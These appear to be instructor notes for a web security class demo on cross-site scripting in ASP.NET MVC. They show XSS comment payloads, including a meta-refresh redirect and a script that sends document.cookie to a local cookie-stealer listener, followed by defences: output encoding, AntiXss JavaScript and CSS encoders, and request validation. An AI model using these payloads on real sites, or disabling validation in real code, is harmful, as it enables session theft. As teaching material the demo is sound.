## Cross Site Scripting attack demo

1. Run the web site and explain this is a run-of-the-mill blog, with comments.
2. Enter a simple comment
3. Enter a command like `<script>alert('XSS!');</script>`
4. Try this (a hacker can use this to send the browser to another website):
```
<meta http-equiv=refresh content="2;URL=http://www.u2u.be/cc/UWSEC">
```

## Cookie stealing demo

1. Run the web site again, ensuring the CookieStealer project is also running.
2. Put a breakpoint on the Mjam method in the CookieStealer project
2. Enter following comment: `<script>document.write('<img src="http://localhost:3693/mjam/' + document.cookie + '" >');</script>`
4. Show the breakpoint being hit, with the cookie!

## Manual HTML encoding

First explain that in MVC there is default output encoding.

Create a new web project, create a **viewmodel** with a `Contents` property set to a script:

```
public class ViewModel
{
  public string Contents { get; set; } = "<script>alert('Okilidokili!');</script>";
}
```

Update the `HomeController`'s Index method:

```
public ActionResult Index()
{
  return View(new ViewModel());
}
```

And modify the view to show this contents:

```
@using ManualEncoding.Models
@model ViewModel

@{
    ViewBag.Title = "Home Page";
}

<div class="row">
  @Model.Contents
</div>
```

**Run** the website and should the result.

Open the **source** window and show the generated HTML.

You can stop this default output encoding using `Html.Raw()` helper.

```
<div class="row">
  @Html.Raw(Model.Contents)
</div>
```

You can manually encode html content using `Server.HtmlEncode()`.

So, for example, you could manually encode everything using

```
@Html.Raw(System.Net.WebUtility.HtmlEncode("<script>Alert('Hello world!')</script>"))
```

Again, show the **page source**


## CSS and Javascript encoding

Start by adding a **script block**

```
<script>
  var myColor = '@Context.Request.Query["myColor"]';
  alert(myColor);
</script>
``` 

Also add a **style block**
```
<style>
  p {
    color: @Context.Request.Query["myColor"];
  }
</style>
```

**Run** your website and refresh the page with a querystring `/?myColor=red`

You should get an alert, and after closing the alert you should see the site's color to be red.

Also the the site's **source**. You see the alert and style with red.

Now **change the query string** to something like `/?myColor=It's raining again`

You will now see that the javascript is using the wrong encoding (`&#39;`). This could be exploited.

We can fix this by using the Microsoft **Anti-XSS** library. There is a library built into MVC, but that one does not implement the Javascript encoder.

Use **NuGet** to install the `AntiXss` package.

Now we also need to add a little **using** statement to the top of the **cshtml** file

```
@using Microsoft.Security.Application
```

Now we can wrap the **javascript encoder** around the `@Request`

```
var myColor = '@Html.Raw(Encoder.JavaScriptEncode(Request.QueryString["myColor"]))';
```

We can also do something similar for the **script** tag:

```
color: @Html.Raw(Encoder.CssEncode(Request.QueryString("myColor")));
```

Now **run** the website, and you will see that we still have a **problem**. That is because
the default javascript encoding will wrap everything with quotes. That is why there is an
overload taking a **emitQuotes** parameter.

```
var myColor = '@Html.Raw(Encoder.JavaScriptEncode(Request.QueryString["myColor"], emitQuotes: false))';
```

**Run** again and show **sources**

**You will now see the proper encoding for javascript and css!**

**FOR .NET CORE** : https://docs.microsoft.com/en-us/aspnet/core/security/cross-site-scripting 

## Request Validation

**Run** the site again, and now use some tags in the query string, for example:

```
http://localhost:26389/Home/Index/?myColor=<i>Green</i>
```

You will get an **error**. 

But what is you want to turn off this default request validation. In ASP.NET MVC you can do this globally using

```
<httpRuntime targetFramework="4.5.2" requestValidationMode="2.0" />
```

If you want you can also turn this off at the **controller level**, or at the **Action level**


